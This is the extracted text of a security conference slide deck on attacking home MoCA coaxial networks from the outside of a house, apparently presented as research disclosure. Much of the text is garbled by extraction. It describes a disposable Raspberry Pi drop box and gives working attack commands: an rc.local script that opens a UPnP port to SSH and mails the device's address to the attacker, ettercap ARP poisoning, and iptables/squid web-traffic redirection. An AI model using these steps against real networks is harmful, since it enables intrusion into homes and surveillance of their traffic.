Raspberry)MoCA)
A)recipe)for)compromise)
Andrew Hunt 
George Mason University 
PI:EMAIL 
Media over Coaxial Alliance 
•  8)–)12)large)companies)
•  How)to)make)use)of)widely)deployed)coaxial)cabling)to)deliver)
content?)
–  Shielded)
–  Lots)of)frequency)bandwidth)
–  Carries)signal)500)feet)
•  PHY/MAC)speciﬁcaLon)
•  Creates)a)network)of)the)coaxial)bus)
•  Delivers)guaranteed)bandwidths)at)certain)distances)
What does MoCA look like? 
MoCA Operation: PHY 
•  PHY is the coaxial cable 
•  Frequencies & signaling)
–  Orthogonal Frequency Division Multiplexing)
–  WAN and LAN channel sets)
MoCA Operation: MAC 
•  Media)Access)Control)
–  Scheduled)frames))
–  Master)node)controller)
–  Time)Division)MulLple)Access)
–  Assured)speeds)
PHY$Rate$)
(Mbps))
Minimum$MAC$)
Rate$(Mbps))
≥275)
139.87)
250)
130.78)
225)
119.45)
200)
107.74)
175)
95.64)
150)
81.98)
125)
68.32)
100)
54.65)
75)
39.82)
MoCA, definitely caffeinated 
•  Enables)‘triple)play’)
•  Desired)by)ISPs)
•  HDTV)requirements)
•  Guaranteed)speeds)
More prevalent than Starbucks 
•  Most)consumers)don’t)even)know)they)have)it)
•  North)American)and)European)service)providers)already)
deploy)it)
•  In)other)words,)just)about)every)broadband)installaLon)
–  FIOS)
–  Cable/Xﬁnity)
–  Dish/Satellite)
–  DVR)
–  STB)
The Wall Wart 
•  OpLcal)cable)run)from)the)neighborhood)splicer)to)the)home)
•  OpLcal)Network)Terminator)(ONT))installed)on)the)exterior)of)
the)home)
–  Bridges)the)ﬁber)to)coaxial)or)CAT5)cable)
–  ISP)prefers)coaxial)!)MoCA)
MoCA Inside 
•  AcLontec)Router)
–  SPI)ﬁrewall)
–  NAT)router)
•  LAN)f)WAN)
–  2)MoCA)nodes)(NC))
–  MoCAftofEthernet)bridge)
•  Digital)Video)Recorder)
–  MoCA)networking)on)board)
–  Depends)on)AcLontec)router)
•  Time)sync)
•  TV)channel)data)
Let’s draw that out a little more 
No Keys Required 
OH SNAP! 
TAKE$IT$
ALL$
Remember, MoCA looks like this? 
DOUBLE SNAP! IT’S OUTSIDE! 
ATTACK$HERE$
Walk up and jack in 
•  ULlity)pointfoffpresence)
•  ONT)+)root)coax)splicer)+)power)
=)SCORE!)
•  Many)homes)have)low)plants)
growing)around)to)obscure)the)
equipment)
–  That)will)provide)useful)cover)for)the)
acacking)equipment)
Tools of the Trade 
•  MoCAftofEthernet)bridge)
•  RGf6)Coaxial)Cable)
•  >1GHz)Coaxial)Splicer)
Burning Bridges 
•  Connect)the)acack)device)
to)the)bridge’s)Ethernet)
interface)
•  AcLontec)LAN)does)not)
engage)link)protecLon)
–  Any)device)can)connect)
What just happened here? 
•  A)MoCA)device)has)been)added)to)the)coaxial)bus)
•  Remember,)both)MoCA)WAN)and)LAN)run)on)the)same)
physical)bus)
•  The)bus)terminates)outside)the)home)
•  By)acaching)to)the)MoCA)LAN,)the)internal)Ethernet)LAN)has)
been)extended)outside)the)home)
Situation normal 
SNAFU 
What could possibly go wrong? 
•  Enables)acacks)defeated)by)a)ﬁrewall)
•  Network)redirecLon)
–  Address)resoluLon)protocol)poisoning)
–  DHCP)response)spoofs)
–  DNS)hijacking)
•  Traﬃc)proﬁling)
–  Deep)packet)inspecLon)
–  What)do)you)do)at)home)that)you)wouldn’t)do)at)work?)
•  What’s)old)is)new)again!)Hello)2001!)
Ethernet attacks, so retro! 
•  Enables)direct)acack)against)the)local)Ethernet)network)
•  Many)acacker)tools)and)frameworks)have)been)developed)to)
automate)inﬁltraLon)
–  Ecercap)
–  dnsniﬀ)
–  Metasploit)
–  BeEF)
–  EvilGrade)
–  Karmetasploit)
This)tacoo)will)protect)me)from)harm!)
•  MoCA)ﬁlters)
•  Block)signal)in)the)MoCA)
ranges)
•  Marketed)as)a)security)layer)to)protect)against)unwanted)
MoCA)signals)
•  Typically)located)on)the)feed)to)the)splicer)
-  Almost)always)exposed)
•  Designed)to)prevent)signal)bleed)between)houses)
-  NOT)between)the)interior)and)exterior)walls.)
Building a disposable attack unit 
•  This)is)a)problem)that)needs)more)acenLon)
•  Create)a)plaqorm)to)automate)the)compromise)of)a)MoCA)
network)
•  Illustrate)that)the)compromise)of)most)target)domiciles)is)as)
simple)as)walking)up)to)them)
ATTACK$HERE$
Requirements 
•  Dropfin)physical)toolkit)
–  Physical)inserLon)
–  Power)
–  CompuLng)device)
•  Remote)access)to)toolkit)
–  Reverse)tunnel,)requires)a)server)
–  Port)forwarding?)
•  Traﬃc)redirecLon)
•  Content)manipulaLon)
Design Objectives 
•  DO)NO)HARM)
–  This)is)a)demo)for)educaLonal)purposes)
–  Random)useless)site)redirecLon)is)obvious,)nondestrucLve)
•  Use)standard)tools)
–  Less)proﬁling)
–  Updatable))
–  Disposable)
•  Minimize)power)consumpLon)
–  Enable)acacker)to)walk)away)and)preserve)cover)
–  Unit)must)last)as)long)as)possible)
•  Control)costs)
Ingredients 
•  Cellphone)Recharging)Bacery)
–  Gorilla)16,800)mAh)
–  Smaller)than)a)paperback)book)
–  Can)run)each)device)on)one)unit)(x2))
–  ~14)hours)upLme)for)a)3VA)device,)like)an)ARM)
•  Raspberry)Pi)
–  Model)B)–)512)MB)RAM)
–  ARM11)processor)
–  Minimal)power)consumpLon)
–  Requires)8GB)class)10)SD)Card)for)storage)(OS))
–  Cheap)
Ingredients 
•  Kali)Linux)
–  Standard)penetraLon)tesLng)distribuLon)
–  Has)necessary)tools)–)Ecercap,)perl,)python)
–  Extendable)via)Debian)repositories)
•  squid,)apache,)miniupnp)
–  Available)images)for)ARM,)including)Raspberry)Pi)
–  FREE))
•  Universal)Plugfnfplay)IGD)protocol)
–  AcLontec)ﬁrewall/router)
•  MoCAftofEthernet)bridge)
–  Netgear)MCAB1001)
Mod to MCAB1001 for better hang-time 
Snip snip… 
Like a good doctor, solder is there 
Winner: Direct Current 
•  UPS)lost)a)lot)to)DC/AC/DC)
conversion)
–  6.5)hours)hangfLme)
–  BEEP!!)LOOK)AT)ME!!)
–  Managed)shutdowns)
•  Portable)bacery)DC/DC)
–  No)loss)in)conversion)
–  Less)hardware,)smaller)
footprint)
–  Size)of)a)small)paperback)
–  One)for)each)device)(load))
Raspberry MoCA assembled 
Universal Plug-n-Play 
•  uPNP)enables)service)discovery)on)broadcast)domains)
•  UDP)port)1900)
•  No)authenLcaLon)
•  No)rouLng)required,)everything)just)blabs)
–  iPhone)
–  Computer)
–  Printer)
–  TVs)f)DLNA)
–  Router)
Internet Gateway Device 
•  uPNP)protocol)to)ease)manipulaLon)of)ﬁrewall)rules)
•  Allows)the)ﬁrewall)to)adjust)
posture)based)on)the)requests)
of)internal)hosts)
-  No)authenLcaLon)
-  Forwards)requested)ports)and)
sets)up)NAT)
•  Most)embedded)routers)
support)IGD)
•  Supported)by)Microsos,)DLNA,)
ISPs)
)
How)helpful!)
Redirect Hijinks 
•  Transparent)proxy)needed)to)manipulate)web)streams)
–  Squid)provides)URL_REWRITE)facility)to)support)3rd)party)tools)
–  Perl)does)the)work)
•  I)Love)My)Neighbors)
–  Josh)Wright’s)wireless)honeypot)distribuLon)
–  Accomplishes)my)goals)(ﬂipping)pics,)funny)things))
–  Perl)scripts)for)URL_REWRITE)
•  Some)BASH)scripLng)to)get)it)all)set)up)
Recipe for Raspberry MoCA:  
Phase 1 
•  InserLon)and)remote)access)
•  Upon)boot,)execute)a)uPNP)command)to)forward)an)external)
port)to)local)SSH)server)
–  {External)IP}:22/tcp)f>){Raspberry)MoCA)IP}:22/tcp)
•  Report)informaLon)to)acacker)
#!/bin/sh -e 
# rc.local 
sleep 120; 
upnpc -a `ip addr | fgrep "inet " | fgrep -v "host lo" | awk '{print $2}' \ 
| awk -F\/ '{print $1}'` 22 22 tcp | tee /tmp/report \ 
| mailx -s `ip addr | fgrep "inet " | fgrep -v "host lo" | awk '{print $2}' \ 
| awk -F\/ '{print $1}'`.report PI:EMAIL 
exit 0 
Recipe: Phase 2 
•  Engage)HTTP)manipulaLon)
•  ARP)poison)the)LAN)
echo)fn),)RedirecLng)traﬃc)
ecercap)fD)fl)/root/ecer.infos)fm)/root/ecer.msgs)fM)arp)//)//)
•  Redirect)web)streams)to)local)proxy)
echo)fn),)RedirecLng)ports)
iptables)ffﬂush)
iptables)fftable)nat)ffﬂush)
iptables)ffdeletefchain)
iptables)fftable)nat)fA)PREROUTING)fi)eth0)fp)tcp)\)
))ffdesLnaLonfport)80)fj)REDIRECT)fftofport)3128)
•  Manipulate)the)web)stream)
rm)/etc/squid3/url_rewrite_program)
ln)fs)$SDIR/$1)/etc/squid3/url_rewrite_program)
service)squid3)restart)>/dev/null)
DEMO 
•  WATCH)THIS!)
famous)last)words….)
Results 
•  ARM11)is)single)core)and)it)shows)
–  A)licle)pokey)for)manipulaLng)large)images)
–  Reduced)apache)and)squid)to)5)threads)
–  Lowers)CPU)interrupt)contenLon)
–  Only)use)redirects)or)injecLons.)Image)processing)is)S..L..O..W..)
•  Traﬃc)redirecLon))
–  Network)with)six)normal)devices)on)it)
–  Phones,)DVR,)computers)
–  All)redirected)with)no)noLceable)performance)issues)
•  Simple)replacement)of)the)word)‘dog’)with)‘cat’)
–  MoCA)works)well)for)this)
Results 
•  Compared)to)acack)injecLons)
–  Images)are)huge)payloads.)InjecLons)are)small.)
–  StaLc)payload)inserLon)does)not)require)heavy)processing)
•  Raspberry)MoCA)Plaqorm)provides)
–  Guaranteed)remote)access)for)a)deﬁned)Lme)
–  Quick)delivery)and)inserLon.)Minimizes)exposure)
–  Low)cost)plaqorm.)<$300)is)disposable)
–  Commodity)components.)Minimizes)proﬁlable)arLfacts)
–  Lowflatency)traﬃc)redirecLon)and)manipulaLon)
•  Find)a)resource)and)implant)a)more)permanent)backdoor)
Security)needs)YOU!)
•  MoCA)implementaLon)presents)a)major)exposure)of)the)
physical)transport)layer)
–  All)other)assumpLons)about)inside)vs.)outside)are)weakened)
•  IGD)weakens)ﬁrewall)protecLons)
•  Bridging)all)networks)together)presents)new)vulnerabiliLes)
•  Requires)reassessment)and)acenLon)from)cable)installers)and)
Internet)providers)
•  Consumers)should)demand)this!)
Ongoing)work)
•  Detect)MoCA)injecLons)
•  Alert)on)network)inserLon)
–  Oﬀer)something)more)than)ArpWatch?)
•  SLIM)and)CounterfPi)
–  in)collaboraLon)with)Stephan)Browarny)
)
QuesLons?)
Andrew Hunt 
George Mason University 
PI:EMAIL 
Backup 
•  Because)someLmes)things)don’t)go)as)planned…)
Man’s Best Friend 
The World Upside-Down 
Watch Out, Plane! 
Prove it!